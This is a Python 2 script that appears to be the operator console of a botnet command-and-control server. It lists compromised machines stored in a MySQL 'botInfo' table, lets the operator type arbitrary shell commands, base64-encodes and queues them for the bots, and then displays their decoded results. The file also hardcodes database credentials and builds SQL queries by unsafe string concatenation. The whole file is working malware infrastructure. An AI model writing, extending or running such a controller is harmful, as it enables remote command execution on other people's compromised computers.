#!/usr/bin/python

import MySQLdb
import sys
import base64

db = MySQLdb.connect(host="127.0.0.1", user="wordpress", passwd="supersecurepassword", db="command")
cursor = db.cursor()

def sendCommand(mID, osT):
	print
	print "Send the following command to machineID: " + mID
	selection = raw_input("$ ")
	encodedSelection = base64.b64encode(selection)
	if len(selection) > 1:
		sql = "INSERT INTO botInfo (machineID, osType, httpCommand, executed) VALUES ('" + mID + "','" + osT + "','" + encodedSelection + "','N')"
		cursor.execute(sql)
		db.commit()
	main()

def controlBot(botID):
	while True:
		sql = "SELECT machineID, osType, httpCommand, httpResults, executed FROM botInfo WHERE id=" + botID
		cursor.execute(sql)
		db.commit()
		if (cursor.rowcount > 0):
			for row in cursor.fetchall():
				id = botID
				machineID = row[0]
				osType = row[1]
				httpCommand = base64.b64decode(row[2])
				encodedResults = row[3]
				if encodedResults:
					httpResults = base64.b64decode(encodedResults)
				else:
					httpResults = "Pending..."
				executed = row[3]
				print
				print "BotID: " + id + " MachineID: " + machineID
				print "Command: " + httpCommand
				print 
				print "Results:"
				print httpResults
				print
			print "I. Issue Command to Bot"
			print "R. Refresh"
			print "Q. Return to Main"
			selection = raw_input(id+"$ ")
			if (selection == 'I') | (selection == 'i'):
				sendCommand(machineID, osType)
			elif (selection == 'Q') | (selection == 'q'):
				main()
			else:
				continue
		else:
			print "Invalid numerical selection."
			break


def main():
	while True:
		print 
		print "Select the number preceding the botID or the following options:"
		sql = "SELECT id, machineID, httpCommand, executed FROM botInfo"
		cursor.execute(sql)
		db.commit()
		if (cursor.rowcount > 0):
			for row in cursor.fetchall():
				id = row[0]
				machineID = row[1]
				httpCommand = base64.b64decode(row[2])
				executed = row[3]
				if executed == 'Y':
					httpResultsExist="Y"
				else:
					httpResultsExist="N"
				print str(id) + ". BotID:" + machineID + " C:" + httpCommand + " R:" + httpResultsExist
		print
		print "R. Refresh"
		print "Q. Quit"
		selection = raw_input("$ ")
		if (selection == 'Q') | (selection == 'q'):
			sys.exit(0)
		elif (selection == 'R') | (selection == 'r'):
			continue
		else:
			controlBot(selection)

if __name__ == "__main__":
        main()

